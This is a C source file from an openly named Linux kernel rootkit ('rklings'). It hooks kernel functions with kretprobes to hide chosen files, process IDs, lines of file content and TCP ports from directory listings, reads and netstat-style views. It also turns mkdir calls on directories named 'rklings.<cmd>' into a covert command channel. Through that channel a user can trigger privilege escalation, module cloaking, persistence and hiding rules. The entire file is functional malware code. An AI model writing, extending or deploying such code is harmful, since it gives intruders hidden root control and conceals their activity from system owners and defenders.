// SPDX-License-Identifier: GPL-2.0
// core/filter.c - Kretprobes for hiding files, PIDs, content, ports, mkdir
// dispatch.
#include "rootkit.h"
#include <linux/dirent.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

#ifndef SEQ_START_TOKEN
#define SEQ_START_TOKEN ((void *)1)
#endif

// Getdents64 filter (files and PIDs)
struct getdents_data {
	void __user *ubuf;
	int fd;
};

// File targets use prefix match (e.g. "rklings" hides rklings.ko,
// rklings.conf). PID targets use exact match.
static bool should_hide_dirent(const char *name)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&rk_file_targets.lock, flags);
	for (i = 0; i < rk_file_targets.count; i++) {
		if (strncmp(name, rk_file_targets.targets[i],
			    strlen(rk_file_targets.targets[i])) == 0) {
			spin_unlock_irqrestore(&rk_file_targets.lock, flags);
			return true;
		}
	}
	spin_unlock_irqrestore(&rk_file_targets.lock, flags);

	if (rk_target_match(&rk_pid_targets, name))
		return true;
	return false;
}

static int getdents_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct getdents_data *data;
	struct pt_regs *uregs;

	data = (struct getdents_data *)ri->data;
	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 1;
	data->fd = (int)uregs->di;
	data->ubuf = (void __user *)uregs->si;
	return 0;
}

static int getdents_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct getdents_data *data;
	struct linux_dirent64 *d;
	long total, off, new_total;
	char *kbuf;

	data = (struct getdents_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	off = 0;
	new_total = total;
	while (off < new_total) {
		d = (struct linux_dirent64 *)(kbuf + off);
		if (should_hide_dirent(d->d_name)) {
			long remaining = new_total - off - d->d_reclen;

			if (remaining > 0)
				memmove(kbuf + off, kbuf + off + d->d_reclen,
					remaining);
			new_total -= d->d_reclen;
		} else {
			off += d->d_reclen;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

struct kretprobe rk_getdents_probe = {
    .handler = getdents_return,
    .entry_handler = getdents_entry,
    .data_size = sizeof(struct getdents_data),
    .maxactive = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

// Read filter (content lines)
struct read_data {
	void __user *ubuf;
	size_t count;
};

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;

	data = (struct read_data *)ri->data;
	data->ubuf = (void __user *)regs->si;
	data->count = (size_t)regs->dx;
	return 0;
}

static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;
	long total, new_total;
	char *kbuf, *pos;

	data = (struct read_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	if (rk_content_targets.count == 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	pos = kbuf;
	new_total = total;

	while (pos < kbuf + new_total) {
		char *nl;
		int line_len;

		nl = memchr(pos, '\n', (kbuf + new_total) - pos);
		if (nl)
			line_len = nl - pos + 1;
		else
			line_len = (kbuf + new_total) - pos;

		if (rk_line_matches(&rk_content_targets, pos, line_len)) {
			long remaining;

			remaining = (kbuf + new_total) - (pos + line_len);
			if (remaining > 0)
				memmove(pos, pos + line_len, remaining);
			new_total -= line_len;
		} else {
			pos += line_len;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

struct kretprobe rk_read_probe = {
    .handler = read_return,
    .entry_handler = read_entry,
    .data_size = sizeof(struct read_data),
    .maxactive = 20,
    .kp.symbol_name = "ksys_read",
};

// TCP seq_show filter (ports)
struct tcp_show_data {
	struct seq_file *seq;
	int saved_count;
	struct sock *sk;
};

static int tcp_show_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct tcp_show_data *data;

	data = (struct tcp_show_data *)ri->data;
	data->seq = (struct seq_file *)regs->di;
	data->saved_count = data->seq->count;
	data->sk = (struct sock *)regs->si;
	return 0;
}

static int tcp_show_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct tcp_show_data *data;
	struct inet_sock *inet;
	unsigned short sport;
	char port_str[8];

	data = (struct tcp_show_data *)ri->data;

	if (data->sk == SEQ_START_TOKEN)
		return 0;

	inet = inet_sk(data->sk);
	sport = ntohs(inet->inet_sport);
	snprintf(port_str, sizeof(port_str), "%u", sport);

	if (rk_target_match(&rk_port_targets, port_str))
		data->seq->count = data->saved_count;

	return 0;
}

struct kretprobe rk_tcp4_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp4_seq_show",
};

struct kretprobe rk_tcp6_probe = {
    .handler = tcp_show_return,
    .entry_handler = tcp_show_entry,
    .data_size = sizeof(struct tcp_show_data),
    .maxactive = 20,
    .kp.symbol_name = "tcp6_seq_show",
};

// Local mkdir command dispatch
#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

enum rk_local_cmd {
	LCMD_ESCALATE,
	LCMD_PID_ESCALATE,
	LCMD_CLOAK,
	LCMD_UNCLOAK,
	LCMD_PERSIST,
	LCMD_UNPERSIST,
	LCMD_HIDE_FILE,
	LCMD_UNHIDE_FILE,
	LCMD_HIDE_PID,
	LCMD_UNHIDE_PID,
	LCMD_HIDE_CONTENT,
	LCMD_UNHIDE_CONTENT,
	LCMD_HIDE_PORT,
	LCMD_UNHIDE_PORT,
	LCMD_UNKNOWN,
};

struct rk_local_cmd_entry {
	const char *prefix;
	int len;
	enum rk_local_cmd kind;
	bool has_arg;
};

static const struct rk_local_cmd_entry local_cmd_table[] = {
    {"e", 1, LCMD_ESCALATE, false},
    {"cloak", 5, LCMD_CLOAK, false},
    {"uncloak", 7, LCMD_UNCLOAK, false},
    {"persist", 7, LCMD_PERSIST, false},
    {"unpersist", 9, LCMD_UNPERSIST, false},
    {"p.", 2, LCMD_PID_ESCALATE, true},
    {"h.f.", 4, LCMD_HIDE_FILE, true},
    {"u.f.", 4, LCMD_UNHIDE_FILE, true},
    {"h.i.", 4, LCMD_HIDE_PID, true},
    {"u.i.", 4, LCMD_UNHIDE_PID, true},
    {"h.c.", 4, LCMD_HIDE_CONTENT, true},
    {"u.c.", 4, LCMD_UNHIDE_CONTENT, true},
    {"h.p.", 4, LCMD_HIDE_PORT, true},
    {"u.p.", 4, LCMD_UNHIDE_PORT, true},
};

static enum rk_local_cmd rk_parse_local(const char *cmd, const char **arg)
{
	int i;

	for (i = 0; i < ARRAY_SIZE(local_cmd_table); i++) {
		const struct rk_local_cmd_entry *e = &local_cmd_table[i];

		if (e->has_arg) {
			if (strncmp(cmd, e->prefix, e->len) == 0) {
				*arg = cmd + e->len;
				return e->kind;
			}
		} else {
			if (strcmp(cmd, e->prefix) == 0) {
				*arg = NULL;
				return e->kind;
			}
		}
	}
	*arg = NULL;
	return LCMD_UNKNOWN;
}

// Try name first, fall back to index (e.g. "secret.txt" or "0").
static int rk_local_unhide(struct rk_target_list *list, const char *arg)
{
	int idx, ret;

	ret = rk_target_remove_name(list, arg);
	if (ret == 0)
		return 0;
	if (kstrtoint(arg, 10, &idx) == 0)
		return rk_target_remove(list, idx);
	return ret;
}

int rk_dispatch_local(const char *cmd)
{
	const char *arg;
	pid_t pid;
	switch (rk_parse_local(cmd, &arg)) {
	case LCMD_ESCALATE:
		return rk_escalate();
	case LCMD_PID_ESCALATE:
		if (kstrtoint(arg, 10, &pid) == 0) {
			rk_set_escalate_pid(pid);
			return 0;
		}
		return -EINVAL;
	case LCMD_CLOAK:
		rk_cloak();
		return 0;
	case LCMD_UNCLOAK:
		rk_uncloak();
		return 0;
	case LCMD_PERSIST:
		return rk_persist();
	case LCMD_UNPERSIST:
		return rk_unpersist();
	case LCMD_HIDE_FILE:
		return rk_target_add(&rk_file_targets, arg);
	case LCMD_UNHIDE_FILE:
		return rk_local_unhide(&rk_file_targets, arg);
	case LCMD_HIDE_PID:
		return rk_target_add(&rk_pid_targets, arg);
	case LCMD_UNHIDE_PID:
		return rk_local_unhide(&rk_pid_targets, arg);
	case LCMD_HIDE_CONTENT:
		return rk_target_add(&rk_content_targets, arg);
	case LCMD_UNHIDE_CONTENT:
		return rk_local_unhide(&rk_content_targets, arg);
	case LCMD_HIDE_PORT:
		return rk_target_add(&rk_port_targets, arg);
	case LCMD_UNHIDE_PORT:
		return rk_local_unhide(&rk_port_targets, arg);
	case LCMD_UNKNOWN:
		return -ENOENT;
	}
	return -ENOENT;
}

// Mkdir kretprobes (intercept mkdir syscalls for local command trigger)
struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_do_mkdir_entry(struct kretprobe_instance *inst,
			     const char __user *pathname)
{
	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data->intercepted = false;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch_local(base + RK_PREFIX_LEN);
	data->intercepted = true;
	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_mkdir_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdirat_entry(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_mkdir_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;

	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = rk_mkdir_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

struct kretprobe rk_mkdirat_probe = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = rk_mkdirat_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};
